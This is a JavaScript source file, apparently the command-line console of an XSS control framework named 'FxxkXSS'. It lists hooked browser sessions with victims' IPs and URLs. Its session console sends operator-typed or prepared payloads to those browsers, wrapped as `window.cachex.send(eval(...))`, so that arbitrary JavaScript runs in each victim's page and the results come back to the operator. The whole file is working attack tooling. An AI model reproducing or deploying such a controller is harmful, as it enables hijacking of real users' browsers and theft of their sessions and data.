import { addNewDefaultLog, getline, default_logs, generateNewLog, addDefaultLogHook, removeDefaultLogHook } from './utils/index.js';
import { directives } from './payloads';

import process from 'process';
//启动websocket监听
import { sockets } from './xss-core';
//开启http监听
import './http-server';

const logger = str => {
    console.log(str);
}

const directives_host = [{
    directive : '.help',
    comment : 'for help',
    fun(){
        addNewDefaultLog('HELP', 'help information will be listed', 'green');
        console.table(directives_host.map(e => ({
            directive : e.directive,
            detail : e.comment
        })));
    }
},{
    directive : '.clear',
    comment : 'clear console',
    fun(){
        console.clear();
    }
},{
    directive : '.session ',
    comment : 'input .session ${id} to start a session console',
    fun(args){
        //args[0] 为id，首先检测存在性
        if(sockets[args[0]]){
            return new Promise(async resolve => {
                await startSessionConsole(args[0]);
                //从session console出来后先清屏再打印控原来的内容
                resolve();
            });
        }
        addNewDefaultLog('SESSION', 'unknown session', 'red');
    }
},{
    directive : '.sessions',
    comment : 'get all of the sessions',
    fun(){
        console.table(sockets.map( e => ({
            id : e.id,
            alive : e.isAlive,
            ip : e.remoteAddress,
            url : e.remoteUrl
        })));
    }
},{
    directive : '.exit',
    comment : 'exit',
    fun(){
        process.exit(0);
    }
}];

const startSessionConsole = id => new Promise(async resolve => {
    //取消主页面消息事件
    removeDefaultLogHook(logger);
    //获取fxxkxss实例
    const session = sockets[id];
    //定义消息事件
    //挂载消息事件
    session.addLogHook(logger);
    //清屏
    console.clear();
    //打印最多十条历史记录
    session.getLogs(0, 10, 'desc').reverse().forEach(log => {
        console.log(log);
    });
    session.addLog(generateNewLog('SESSION', `Started session ${id} console, input .help for guide`, 'white'));
    while(true){
        let command = await getline('');
        if(command === '.background'){
            break;
        }else if(command[0] === '/'){
            for(const i of directives){
                if(i.directive === command.substr(0, i.directive.length)){
                    //检测payload类型
                    switch(typeof i.payload){
                        case 'string':
                            command = i.payload;
                            break;
                        case 'function':
                            command = i.payload(id, command.split(/[ ]/g).slice(1));
                            break;
                    }
                    break;
                }
            }
        }
        if(command){
            //执行js
            session.sendPayloadSync(`window.cachex.send(eval("${command}"))`);
        }
    }
    //取消挂载
    session.removeLogHook(logger);
    //清屏
    console.clear();
    //打印原来的log
    default_logs.reverse().slice(0, 10).reverse().forEach(e => {
        console.log(e);
    });
    //挂载主页面log
    addDefaultLogHook(logger);
    resolve();
});

//cli入口
(function(){
    console.log('Welcome to FxxkXSS console, this is designed for cli user, wish you enjoy it ~ ');
    console.log('/**\n * Author: Yeuoly\n * Group: Day1\n * Github: https://github.com/Yeuoly\n */');
    console.log('input .help for guide');

    //挂载主log事件
    addDefaultLogHook(logger);

    setTimeout(async () => {
        while(true){
            const command = await getline('');
            if(command[0] === '.'){
                for(const i of directives_host){
                    if(i.directive === command.substr(0, i.directive.length)){
                        try{
                            await i.fun(command.split(/[ ]/g).slice(1));
                        }catch(e){
                            addNewDefaultLog('ERROR', e, 'red');
                        }
                    }
                }
            }else{
                addNewDefaultLog('ERROR', 'Unknown command', 'red');
            }
        }
    }, 100);
})();